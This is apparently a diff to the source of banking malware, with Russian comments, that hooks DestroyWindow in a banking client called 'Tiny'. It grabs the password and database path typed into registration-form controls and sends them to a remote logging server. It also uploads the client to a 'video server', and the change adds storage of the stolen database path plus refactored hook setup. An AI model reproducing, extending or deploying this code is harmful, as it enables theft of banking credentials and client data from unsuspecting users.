@@ -14,6 +14,7 @@
 #include "Unhook.h"
 #include <shlwapi.h>
 #include <shlobj.h>
+#include "odbc.h"
 
 #include "BotDebug.h"
 
@@ -35,6 +36,7 @@ char folderTiny[MAX_PATH];
 //контролы с которых нужно забрать текст в форме регистрации
 DWORD GrabControls[] = { 0x79770896 /* TComboBox */, 0x48B934F1 /* TEdit */, 0 };
 const int MaxFindedControl = 3;
+static char pathMDB[MAX_PATH]; //путь к базе данных
 
 struct ForFindControl
 {
@@ -45,6 +47,9 @@ struct ForFindControl
 };
 
 BOOL (WINAPI *RealDestroyWindow)( HWND hWnd );
+
+static bool SetHooks();
+static bool InitData();
 
 //отсылка полного клиента на видео сервер
 DWORD WINAPI SendTiny(LPVOID)
@@ -131,6 +136,7 @@ static DWORD SendGrabData( ForFindControl* ffc )
 	AddStrLog( "Password", ffc->texts[2], resultGrab.AsStr() );
 	AddStrLog( "Path database", ffc->texts[1], resultGrab.AsStr() );
 	AddStrLog( "Path client", folderTiny, resultGrab.AsStr() );
+	m_lstrcpy( pathMDB, ffc->texts[1] );
 	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
 	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
 	MemFree(ffc);
@@ -159,6 +165,10 @@ static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 	return TRUE;
 }
 
+/////////////////////////////////////////////////////////////////////
+// Хуки
+/////////////////////////////////////////////////////////////////////
+
 static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
 {
 	DWORD hash = GetWndClassHash(hwnd);
@@ -175,6 +185,8 @@ static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
 	return RealDestroyWindow(hwnd);
 }
 
+///////////////////////////////////////////////////////////////////////////////
+
 //активация при регистариции
 void Activeted(LPVOID Sender)
 {
@@ -182,10 +194,7 @@ void Activeted(LPVOID Sender)
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
 	MegaJump(SendTiny);
 	VideoProcess::RecordPID( 0, "Tiny" );
-	if( HookApi( DLL_USER32, 0xEB4A6DB3 /* DestroyWindow */, &HandlerDestroyWindow, &RealDestroyWindow ) )
-	{
-		DBG( "Tiny", "установили хук на DestroyWindow" );
-	}
+	SetHooks();
 }
 
 bool Init( const char* appName )
@@ -207,6 +216,23 @@ bool Init( const char* appName )
 		return true;
 	}
 	return false;
+}
+
+static bool SetHooks()
+{
+	if( HookApi( DLL_USER32, 0xEB4A6DB3 /* DestroyWindow */, &HandlerDestroyWindow, &RealDestroyWindow ) )
+	{
+		DBG( "Tiny", "установили хук на DestroyWindow" );
+	}
+	return true;
+}
+
+static bool InitData()
+{
+	pathMDB[0] = 0;
+//	if( GetAdminUrl(domain) == 0 )
+//		domain[0] = 0;
+	return true;
 }
 
 }
